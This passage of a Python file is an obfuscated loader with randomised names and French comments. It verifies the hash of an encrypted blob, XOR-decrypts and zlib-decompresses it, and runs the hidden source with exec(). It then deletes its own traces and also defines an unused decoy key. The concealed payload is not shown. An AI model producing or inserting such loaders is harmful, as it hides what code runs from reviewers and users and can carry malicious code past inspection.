_clgksRPj8wUXJu + _cc0cFoVkBImEuS + _cgEQ7uZ2S_jtt_ + _cbJLwQvCgSEgBN + _cpZ9HdJQUfG0i6 + _cpKVu66uBhJmwL + _cbf7OCYwtxXGO4 + _czxKGx8lmKtb7f + _czYM1mtzzJqfUt + _cuh5uBHbjM7Ypi + _ctL7uxgCENdnKb + _ckypexiOe1Jc_L + _cwaScAQbm99t7V + _ciQ3MSLAR_3xVA + _crONKBNXRhXM4j + _ckcWF2duUa4xBD + _czX2nGDhzmvJtQ + _ctvNuO4A3Fxmb8 + _coPZLn1_6gzEec + _cgjjWQyy05yOyh + _cfDsLn0auXTlqR + _cyLm9UdeunQHkj + _cswFUvPxaZc5o5 + _cvdoqSShpQSxNp + _cbGMQNsbKlSofG + _cgjAEyfdBik_U0 + _ckG_vOmFBQppqX + _cshq00LAjP1lgv + _ce_aMiIfv_U4GC + _ckjEa3b1L5nzNf + _cqVm47OBL6or22 + _cjGvk6k4SS2zzp + _cwd6VZmUA7dqiN + _cwiPjsVIuWf_p7 + _cd0CRAkCeYZm46 + _cnlysgsyGerWm2 + _cyxLZPSfRF8Efo + _ciIbdr0Xxx8FMk)
if __import__('hashlib').sha256(_piBwybLF8hb4t1).hexdigest() != '5edd00090373e0b41cf4e77bf3cf2d19020e387eb404b4a3a764b4e814e75ef0':
    __import__('sys').exit(1)
_xnr3TsxEjFOZ7K = bytes([134, 181, 189, 141, 52, 77, 176, 50, 226, 111, 179, 175, 32, 92, 229, 206, 39, 250, 7, 249, 11, 39, 49, 138, 188, 218, 189, 90, 116, 155])
_fkgUf0jN7U4MTV6 = bytes([107, 147, 248, 210, 229, 22, 115, 186, 31, 95, 150, 44, 175, 79, 254, 122, 200, 49, 135, 124, 231, 9, 103, 96, 36, 91, 103, 79, 226, 41])

def _fxdUO4UkDmQX8qB(_bp8JmJwQSdMZeB, _kkfhTnt8y8vwDc):
    return bytes(_bp8JmJwQSdMZeB[_izBqxsdYgH1Jd6] ^ _kkfhTnt8y8vwDc[_izBqxsdYgH1Jd6 % len(_kkfhTnt8y8vwDc)] for _izBqxsdYgH1Jd6 in range(len(_bp8JmJwQSdMZeB)))

def _fdj8Ihf6WxrwoHT(_tnXynJ_UeCFY26):
    import zlib
    return zlib.decompress(_tnXynJ_UeCFY26) # Un seul niveau de zlib ici pour simplifier

def _feggRlceruHZHSR():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xoTwTTzNhCfE9B = _fxdUO4UkDmQX8qB(_piBwybLF8hb4t1, _xnr3TsxEjFOZ7K)
    # 2. Décompression Zlib
    _dysyEN1Mzvt8Tg = _fdj8Ihf6WxrwoHT(_xoTwTTzNhCfE9B)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dysyEN1Mzvt8Tg.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nggeqfiBR7oNt4 = _main.__dict__
    _nggeqfiBR7oNt4.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nggeqfiBR7oNt4)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feggRlceruHZHSR()
try:
    del _fxdUO4UkDmQX8qB, _fdj8Ihf6WxrwoHT, _feggRlceruHZHSR
    del _piBwybLF8hb4t1, _xnr3TsxEjFOZ7K, _fkgUf0jN7U4MTV6
except:
    pass
